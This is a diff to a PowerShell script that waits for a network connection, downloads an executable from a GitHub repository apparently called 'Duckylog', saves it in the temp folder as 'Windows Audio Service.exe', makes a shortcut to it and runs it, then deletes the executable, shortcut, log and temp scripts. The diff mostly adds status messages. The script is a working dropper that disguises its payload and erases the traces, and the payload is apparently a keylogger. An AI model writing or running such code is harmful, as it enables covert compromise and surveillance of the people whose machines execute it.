@@ -15,19 +15,25 @@ function Test-NetworkConnection {
 
 # Wait for an active network connection
 while (-Not (Test-NetworkConnection)) {
+    Write-Output "Waiting for network connection..."
     Start-Sleep -Seconds 5
 }
 
 # Check if the shortcut exists
 if (-Not (Test-Path $shortcutPath)) {
+    Write-Output "Shortcut does not exist at $shortcutPath"
+
     # Path to the executable
     $exePath = "$env:TEMP\Windows Audio Service.exe"
 
     # URL to the executable on GitHub
-    $exeUrl = "https://github.com/Mocipie/Duckylog/raw/main/Windows%20Audio%20Service.exe"
+    $exeUrl = "https://github.com/Mocipie/Duckylog/blob/main/Windows%20Audio%20Service.exe"
 
     # Download the executable from GitHub
     Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+
+    # Log the download
+    Write-Output "Downloaded Windows Audio Service.exe to $exePath"
 
     # Create a WScript.Shell COM object
     $wshShell = New-Object -ComObject WScript.Shell
@@ -37,6 +43,11 @@ if (-Not (Test-Path $shortcutPath)) {
     $shortcut.TargetPath = $exePath
     $shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($exePath)
     $shortcut.Save()
+
+    # Log the shortcut creation
+    Write-Output "Shortcut created at $shortcutPath"
+} else {
+    Write-Output "Shortcut already exists at $shortcutPath"
 }
 
 # Function to clean up PowerShell scripts in the temp directory
@@ -55,18 +66,23 @@ try {
     # Run the executable
     $exeProcess = Start-Process -FilePath $exePath -NoNewWindow -PassThru
     $exeProcess.WaitForExit()
-}
-finally {
+} finally {
     if (Test-Path $logFilePath) { Remove-Item -Path $logFilePath }
     
     # Remove the shortcut if it exists
     if (Test-Path $shortcutPath) {
         Remove-Item -Path $shortcutPath -Force
+        Write-Output "Shortcut removed from $shortcutPath"
+    } else {
+        Write-Output "Shortcut does not exist at $shortcutPath"
     }
 
     # Remove the executable if it exists
     if (Test-Path $exePath) {
         Remove-Item -Path $exePath -Force
+        Write-Output "Executable removed from $exePath"
+    } else {
+        Write-Output "Executable does not exist at $exePath"
     }
 
     Cleanup-TempScripts
@@ -74,6 +90,7 @@ finally {
 
 # Ensure the script terminates last
 Start-Sleep -Seconds 2
+Write-Output "Cleanup completed. Exiting PowerShell script."
 
 # Exit the PowerShell session
 exit
